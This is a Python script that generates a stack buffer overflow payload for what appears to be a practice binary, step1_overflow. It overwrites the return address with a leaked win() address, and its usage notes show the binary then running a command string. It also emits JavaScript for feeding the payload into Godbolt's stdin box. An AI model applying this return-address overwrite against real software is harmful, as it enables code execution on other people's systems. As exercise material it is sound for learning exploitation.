#!/usr/bin/env python3
"""
Generate exploit payload for step1_overflow.

Reads win() address from stdin (binary's stdout) and outputs payload to stdout.
Also generates JavaScript code for Godbolt Compiler Explorer (to stderr).

Usage examples:

1. With process substitution (bash/zsh):
   ./step1_overflow "echo 'ARBITRARY CODE EXECUTION'" <(./step1_overflow 2>&1 | python3 step1_gen.py)

2. Manual two-step:
   # Step 1: Get address
   ./step1_overflow 2>&1 | head -1 > address.txt
   # Step 2: Generate payload and pipe to binary
   cat address.txt | python3 step1_gen.py | ./step1_overflow "echo 'ARBITRARY CODE EXECUTION'"

3. Generate JavaScript for Godbolt:
   ./step1_overflow 2>&1 | head -1 | python3 step1_gen.py 2> exploit.js
   # Then paste exploit.js into browser console on Godbolt
"""

import re
import struct
import sys


def main() -> None:
    # Read win() address from stdin (binary's stdout)
    first_line = sys.stdin.buffer.readline()

    match = re.search(rb"0x([0-9a-fA-F]+)", first_line)
    if not match:
        print("Error: failed to parse win() address", file=sys.stderr)
        print(f"Line: {first_line}", file=sys.stderr)
        sys.exit(1)

    win_addr = int(match.group(1), 16)

    # Generate payload: 32 bytes padding + win() address
    payload = b"A" * 32 + struct.pack("<Q", win_addr)

    # Output payload to stdout (will be piped to binary's stdin)
    try:
        sys.stdout.buffer.write(payload)
        sys.stdout.buffer.flush()
    except BrokenPipeError:
        # Process reading from us closed the pipe - this is fine
        pass

    # Generate JavaScript code for Godbolt Compiler Explorer
    # Convert payload bytes to JavaScript array
    bytes_array = [b for b in payload]
    bytes_js = "[" + ", ".join(str(b) for b in bytes_array) + "]"

    js_code = f"""// Exploit payload for step1_overflow
// win() address: 0x{win_addr:x}
// Paste this into browser console on Godbolt Compiler Explorer

const textarea = document.querySelector('textarea.execution-stdin.form-control');

const bytes = {bytes_js}; // Payload: 32 bytes 'A' + win() address
const binaryString = String.fromCharCode(...bytes);

const nativeSetter = Object.getOwnPropertyDescriptor(window.HTMLTextAreaElement.prototype, "value").set;
nativeSetter.call(textarea, binaryString);

textarea.dispatchEvent(new Event('input', {{ bubbles: true }}));
"""

    # Output JavaScript to stderr so it doesn't interfere with binary payload
    print(js_code, file=sys.stderr)


if __name__ == "__main__":
    main()
